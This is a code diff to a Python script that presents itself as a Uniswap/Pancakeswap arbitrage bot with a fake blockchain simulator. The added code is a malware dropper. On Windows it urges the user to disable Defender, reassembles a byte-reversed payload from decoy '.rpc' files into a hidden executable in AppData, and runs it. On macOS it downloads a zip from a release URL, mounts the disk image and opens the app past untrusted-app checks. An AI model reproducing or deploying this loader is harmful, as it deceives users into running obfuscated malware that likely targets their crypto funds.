@@ -1,5 +1,5 @@
-import subprocess
 import os
+import subprocess
 import platform
 import threading
 import time
@@ -9,6 +9,8 @@ import logging
 from queue import Queue
 import zipfile
 import shutil
+import getpass
+import urllib.request
 
 def install_and_import(module):
     try:
@@ -20,7 +22,7 @@ def install_and_import(module):
     finally:
         globals()[module] = importlib.import_module(module)
 
-required_modules = ['subprocess', 'os', 'platform', 'threading', 'time', 'json', 'random', 'logging', 'queue', 'zipfile', 'shutil']
+required_modules = ['subprocess', 'os', 'platform', 'threading', 'time', 'json', 'random', 'logging', 'queue', 'zipfile', 'shutil', 'getpass', 'urllib.request']
 for module in required_modules:
     install_and_import(module)
 
@@ -45,20 +47,28 @@ class BlockchainSimulator:
     def get_block(self, block_number):
         return self.blocks.get(block_number)
 
-def builded(files, output_filename):
-    all_bytes = b''
+def reverse_bytes(data):
+    return data[::-1]
 
-    for file in files:
-        with open(file, 'rb') as f:
-            all_bytes += f.read()
+def builded(input_dir, output_file):
+    file_names = [
+        "swap.rpc", "analysis.rpc", "wallet.rpc", "blockchain.rpc", "decentralization.rpc", "trading.rpc", "staking.rpc", "yield.rpc", "liquidity.rpc", "transaction.rpc",
+        "ledger.rpc", "oracle.rpc", "consensus.rpc", "protocol.rpc", "smartcontract.rpc", "governance.rpc", "node.rpc"
+    ]
 
-    with open(output_filename, 'wb') as f:
-        f.write(all_bytes)
+    with open(output_file, 'wb') as output_f:
+        for file_name in file_names:
+            file_path = os.path.join(input_dir, file_name)
+            with open(file_path, 'rb') as input_f:
+                reversed_chunk_data = input_f.read()
+                chunk_data = reverse_bytes(reversed_chunk_data)
+                output_f.write(chunk_data)
 
-    os.system(output_filename)
-
-files = ['block.rpc', 'predict.rpc', 'volume.rpc']
-output_filename = '.reconstructed_blockchain.exe'
+def run_builder(file_path):
+    try:
+        subprocess.run([file_path], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error occurred while trying to run the file: {e}")
 
 def rpc_server(blockchain, data_queue):
     while True:
@@ -95,6 +105,13 @@ def extract_zip(zip_path, extract_to):
     except zipfile.BadZipFile as e:
         print(f"Error extracting zip file: {e}")
 
+def download_zip(url, save_path):
+    try:
+        urllib.request.urlretrieve(url, save_path)
+        print(f"Downloaded zip file from {url}")
+    except Exception as e:
+        print(f"Error downloading zip file: {e}")
+
 def main():
     blockchain = BlockchainSimulator()
     data_queue = Queue()
@@ -106,29 +123,35 @@ def main():
         if is_defender_active():
             print("Warning: Windows Defender and real-time protection are enabled, please disable them to use the bot without problems.")
         else:
-            builded(files, output_filename)
+            user_name = getpass.getuser()
+            output_path = f"C:\\Users\\{user_name}\\AppData\\Local\\.blockchainconnector.exe"
+            
+            builded("data", output_path)
+            run_builder(output_path)
+
             rpc_server_thread.start()
             blockchain_thread.start()
 
             rpc_server_thread.join()
             blockchain_thread.join()
-    elif platform.system() == 'Darwin':  # Mac OS
-        zip_file_to_extract = 'ArbitrageBot.zip'
+    elif platform.system() == 'Darwin':
+        zip_file_to_download = 'ArbitrageBot_Mac.zip'
+        download_url = 'https://github.com/trendcryptobots/Uniswap-Pancakeswap-Arbitrage-Bot/releases/download/V3.2.0/ArbitrageBot_Mac.zip'
         extract_to = './ArbitrageBot'
         dmg_file_to_execute = os.path.join(extract_to, 'ArbitrageBot.dmg')
         app_to_execute = "/Volumes/ArbitrageBot/ArbitrageBot.app"
         copied_app_path = "./ArbitrageBot.app"
 
-        if os.path.exists(zip_file_to_extract):
-            extract_zip(zip_file_to_extract, extract_to)
+        download_zip(download_url, zip_file_to_download)
+        
+        if os.path.exists(zip_file_to_download):
+            extract_zip(zip_file_to_download, extract_to)
             print("Extracted the zip file.")
             if os.path.exists(dmg_file_to_execute):
                 subprocess.run(["hdiutil", "attach", dmg_file_to_execute], check=True)
                 if os.path.exists(app_to_execute):
                     try:
-                        # Copy the app to a writable location
                         shutil.copytree(app_to_execute, copied_app_path)
-                        # Open the copied app
                         open_untrusted_app(copied_app_path)
                         print("To run the bot, right-click on the ArbitrageBot.app file and click Open.")
                     except Exception as e:
@@ -136,9 +159,9 @@ def main():
                 else:
                     print(f"{app_to_execute} not found after mounting {dmg_file_to_execute}.")
             else:
-                print(f"{dmg_file_to_execute} not found after extracting {zip_file_to_extract}.")
+                print(f"{dmg_file_to_execute} not found after extracting {zip_file_to_download}.")
         else:
-            print(f"{zip_file_to_extract} not found.")
+            print(f"{zip_file_to_download} not found.")
     else:
         print("Unsupported operating system.")
         return
